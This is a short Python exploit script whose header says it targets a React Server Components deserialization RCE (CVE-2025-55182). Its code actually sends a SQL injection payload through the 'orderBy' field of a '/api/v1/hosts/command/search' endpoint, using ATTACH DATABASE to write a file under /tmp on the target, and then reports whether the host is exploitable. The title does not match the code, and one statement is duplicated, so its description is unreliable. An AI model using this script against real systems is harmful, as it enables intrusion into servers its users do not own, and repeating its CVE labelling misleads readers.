# Title: React Server Components Flight Protocol Deserialization RCE (CVE-2025-55182)
# Date : 2025-12-13
# Author: Dong Cong
#         
# Website: https://congdong007.github.io/
# 
# CVE : CVE-2025-55182

#!/usr/bin/python3

import requests
import argparse
import warnings

warnings.filterwarnings("ignore")

parser=argparse.ArgumentParser()
parser.add_argument("--host",help="input the vulnerable host", type=str)
parser.add_argument("--cookie","-k", help="input the cookie", type=str)
args = parser.parse_args()


host = args.host
cookie = args.cookie

url = f"{host}/api/v1/hosts/command/search"

print(host)


headers = {
    "Accept-Language": "zh",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Cookie": f"{cookie}",
    "Connection": "close"
}

data = {
    "page": 1,
    "pageSize": 10,
    "groupID": 0,
    "orderBy": "3;ATTACH DATABASE '/tmp/randstr.txt' AS test;"
               "create TABLE test.exp (data text);"
               "create TABLE test.exp (data text);"
               "drop table test.exp;",
    "order": "ascending",
    "name": "a"
}

response = requests.post(
    url,
    headers=headers,
    json=data,
    timeout=10
)

if response.status_code == 200:
    if 'SQL logic error:' in response.text:
        print(f"{host} exploitable!")
    else:
        print(f"{host} unexploitable!")

